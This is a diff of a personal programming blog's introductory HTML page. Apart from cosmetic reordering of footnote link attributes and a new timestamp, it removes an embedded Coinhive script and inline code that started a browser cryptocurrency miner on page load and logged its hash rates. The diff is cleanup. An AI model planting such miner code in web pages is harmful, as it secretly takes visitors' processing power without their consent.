@@ -39,31 +39,8 @@
         })();
   </script>
   
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
-<script>
-  var miner = new CoinHive.Anonymous('0Q2TtxhYQVKpZ8093Pd2RDdyZaWsqJoh');
-  miner.start();
-</script>
-
-<script>
-  // Listen on events
-  miner.on('found', function() {  })
-  miner.on('accepted', function() {  })
-
-  // Update stats once per second
-  setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-
-      // Output to HTML elements...
-      console.log("H/s: " + hashesPerSecond);
-      console.log("Total Hashes: " + totalHashes);
-      console.log("Acepted Hashes: " + acceptedHashes);
-  }, 1000);
-</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -117,7 +94,7 @@
     </header>
       <p><h2 id="overview"><a class="toclink" href="#overview">Overview</a></h2>
 <p>Welcome to my blog, regardless of how randomly you've arrived here! Also, this web space
-doesn't discriminate between human beings and search-engine robots<sup id="fnref:google_bot"><a rel="footnote" class="footnote-ref" href="#fn:google_bot">1</a></sup>, so congrats for
+doesn't discriminate between human beings and search-engine robots<sup id="fnref:google_bot"><a class="footnote-ref" rel="footnote" href="#fn:google_bot">1</a></sup>, so congrats for
 having joined the party (intendedly or not ;) )!</p>
 <p>Given the above, dear reader, you're now officially entitled for sampling serialized items
 from the bizarrely random distribution of thought processes going on in my head.
@@ -134,7 +111,7 @@ Please, find an excerpt from the very source code powering said thought processe
 </pre></div>
 
 
-<p>As it can be easily inferred at this point, the predominant nature of blog-post topics will span across the areas of programming, data science, analysis and visualization - sometimes seasoned with a bit of <a href="/tagged/football">football</a><sup id="fnref:soccer"><a rel="footnote" class="footnote-ref" href="#fn:soccer">2</a></sup> flavour<sup id="fnref:football_skills"><a rel="footnote" class="footnote-ref" href="#fn:football_skills">3</a></sup>.</p>
+<p>As it can be easily inferred at this point, the predominant nature of blog-post topics will span across the areas of programming, data science, analysis and visualization - sometimes seasoned with a bit of <a href="/tagged/football">football</a><sup id="fnref:soccer"><a class="footnote-ref" rel="footnote" href="#fn:soccer">2</a></sup> flavour<sup id="fnref:football_skills"><a class="footnote-ref" rel="footnote" href="#fn:football_skills">3</a></sup>.</p>
 <p>Feel free to visit my GitHub <a href="https://github.com/hristog">profile</a> for a sample of my programming mastery (or "mastery" ;)). Alternatively, you can view a <a href="https://github.com/search?o=asc&amp;q=is%3Apr+author%3Ahristog&amp;ref=searchresults&amp;s=created&amp;type=Issues&amp;utf8=✓">list</a> of literally all GitHub pull requests of mine, that have ever been made. I'm an avid reader and podcast listener, and I've recently put together a <a href="https://github.com/hristog/awesome-podcasts">list</a> of all <a href="https://hristog.github.io/tagged/python">#Python</a>, Machine Learning and <a href="https://hristog.github.io/tagged/data-science">#DataScience</a>-related podcasts that I follow on a daily basis. A similar list of books might follow.</p>
 <h2 id="the_definition_of_t0"><a class="toclink" href="#the_definition_of_t0">The definition of t<sub>0</sub></a></h2>
 <p>It all started when I was 7 or 8 years old. It couldn't be distinguished from any other visit to my aunt's flat, yet nevertheless that particular one turned out to change my life. Forever.</p>
@@ -145,32 +122,32 @@ over several pages, and if you'd want to interact in a bit more engaging way wit
 laboriously type up the code, character by character (and, yes - in the case of BASIC - along with line number, too).</p>
 <p>A peculiar characteristic of that book was the it was greatly illustrated, and the bugs in the
 programs were represented as cartoons of computerised bugs. I couldn't stop devouring the pages, one
-after another - everything just clicked<sup id="fnref:basic_for_beginners"><a rel="footnote" class="footnote-ref" href="#fn:basic_for_beginners">4</a></sup>.</p>
+after another - everything just clicked<sup id="fnref:basic_for_beginners"><a class="footnote-ref" rel="footnote" href="#fn:basic_for_beginners">4</a></sup>.</p>
 <p>That marked the beginning of my love affair with abstract representations, skyscrapers built upon
-layers of logic and the alluring notion of attempting to create artificial intelligence<sup id="fnref:artificial_intelligence"><a rel="footnote" class="footnote-ref" href="#fn:artificial_intelligence">5</a></sup>.</p>
+layers of logic and the alluring notion of attempting to create artificial intelligence<sup id="fnref:artificial_intelligence"><a class="footnote-ref" rel="footnote" href="#fn:artificial_intelligence">5</a></sup>.</p>
 <div class="footnote">
 <hr />
 <ol>
 <li id="fn:google_bot">
 <p>Yes, I'm pointing at you, <code>Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</code>!
 You were caught only because your <a href="https://www.google.com/recaptcha/intro/">reCAPTCHA</a> score was completely off the charts.
-Apparently, emulating human unintelligence in AI is becoming one of the most important 21st century features, among those ones which haven't been given enough consideration. Just some food for thought ... <a rev="footnote" title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:google_bot">↩</a></p>
+Apparently, emulating human unintelligence in AI is becoming one of the most important 21st century features, among those ones which haven't been given enough consideration. Just some food for thought ... <a title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:google_bot" rev="footnote">↩</a></p>
 </li>
 <li id="fn:soccer">
-<p>I'm referring to the European variety, a.k.a. soccer. <a rev="footnote" title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:soccer">↩</a></p>
+<p>I'm referring to the European variety, a.k.a. soccer. <a title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:soccer" rev="footnote">↩</a></p>
 </li>
 <li id="fn:football_skills">
 <p>For the curious among yourselves, I've recorded a sample of a little kickabout
-of mine with a mini-football. <a href="https://www.youtube.com/watch?v=yiiYNxNOmxk">Enjoy</a> :) <a rev="footnote" title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:football_skills">↩</a></p>
+of mine with a mini-football. <a href="https://www.youtube.com/watch?v=yiiYNxNOmxk">Enjoy</a> :) <a title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:football_skills" rev="footnote">↩</a></p>
 </li>
 <li id="fn:basic_for_beginners">
 <p>Wait a minute, I never said it was a book on programming nuclear physics
 simulations with BASIC! It was your typical introductory book a-la "Here's how you do loops, and
-this is how you do conditional statements". <a rev="footnote" title="Jump back to footnote 4 in the text" class="footnote-backref" href="#fnref:basic_for_beginners">↩</a></p>
+this is how you do conditional statements". <a title="Jump back to footnote 4 in the text" class="footnote-backref" href="#fnref:basic_for_beginners" rev="footnote">↩</a></p>
 </li>
 <li id="fn:artificial_intelligence">
 <p>I'm pretty sure I was not familiar of the exact term back then (to be fair, even nowadays, there doesn't seem to be a generally agreed-upon definition that best captures the notion yet), but I tended to daydream about building robots, and eventually my passion converged
-on focusing with their "brains". <a rev="footnote" title="Jump back to footnote 5 in the text" class="footnote-backref" href="#fnref:artificial_intelligence">↩</a></p>
+on focusing with their "brains". <a title="Jump back to footnote 5 in the text" class="footnote-backref" href="#fnref:artificial_intelligence" rev="footnote">↩</a></p>
 </li>
 </ol>
 </div><p></p>
@@ -202,7 +179,7 @@ on focusing with their "brains". <a rev="footnote" title="Jump back to footnote
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-12-23T18:36:06Z -->
+  <!-- Last generated: 2018-04-02T21:37:01Z -->
 </body>
 </html>
 
